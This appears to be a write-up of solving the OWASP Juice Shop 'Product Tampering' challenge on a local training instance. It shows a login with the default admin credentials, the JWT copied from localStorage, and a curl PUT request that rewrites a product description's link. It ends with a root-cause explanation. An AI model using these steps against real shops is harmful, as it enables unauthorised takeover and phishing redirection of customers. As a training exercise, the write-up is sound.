# Product Tampering: Change the href of the Link Within the O-Saft Product Description

**Objective:** Change the `href` of the link within the O-Saft product's description.

## Steps Taken

### 1. Logged in as admin and retrieved a fresh JWT

Logged in with the default admin account (`admin@juice-sh.op` / `admin123`), then copied the token from `localStorage` via the browser Console:

```javascript
copy(localStorage.getItem('token'))
```

Saved it to `~/token.txt` in Kali.

<img width="378" height="44" alt="Screenshot 2026-10-09 100322" src="https://github.com/user-attachments/assets/b4365ee8-8c19-41f3-bdac-ab16b86e383c" />

<img width="483" height="477" alt="Screenshot 2026-10-09 100257" src="https://github.com/user-attachments/assets/87e797ea-1216-45ce-9de2-595f4169e066" />


### 2. Found the product's database ID

Queried the REST search endpoint:

```bash
curl -s "http://localhost:3000/rest/products/search?q=o-saft"
```
Result confirmed O-Saft's database ID is `9`, and that its description already contains a link:

```json
"description":"...<a href=\"https://www.owasp.org/index.php/O-Saft\" target=\"_blank\">More ...</a>"
```
<img width="474" height="64" alt="Screenshot 2026-10-09 233706" src="https://github.com/user-attachments/assets/fb8cd22d-22fb-47f8-928b-7453c26e7ab0" />

### 3. Sent a PUT request to tamper with the product description

```bash
TOKEN=$(cat ~/token.txt)
curl -s -X PUT http://localhost:3000/api/Products/9 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  --data-raw '{"description": "<a href=\"https://owasp.slack.com\" target=\"_blank\">More...</a>"}'
```

### 4. Verified the result

The response confirmed success:

```json
{"status":"success","data":{"id":9,"name":"OWASP SSL Advanced Forensic Tool (O-Saft)","description":"<a href=\"https://owasp.slack.com\" target=\"_blank\">More ... </a>", ...}}
```
<img width="474" height="90" alt="Screenshot 2026-10-09 233724" src="https://github.com/user-attachments/assets/237d5453-e830-4469-8116-816ac37ac1c4" />

The description's link `href` was changed from `https://www.owasp.org/index.php/O-Saft` to `https://owasp.slack.com`.

## Result

Challenge solved — confirmed on the Score Board.
<img width="483" height="449" alt="Screenshot 2026-10-09 233859" src="https://github.com/user-attachments/assets/b60ea6a8-6b0d-49d1-a7b6-46ee6e367658" />


## Root Cause

The product update endpoint (`PUT /api/Products/:id`) accepts arbitrary field updates — including raw HTML in the `description` field — from any client holding a valid (in this case, admin) authentication token, with no restriction on which links or markup can be injected.

## Status

Solved.
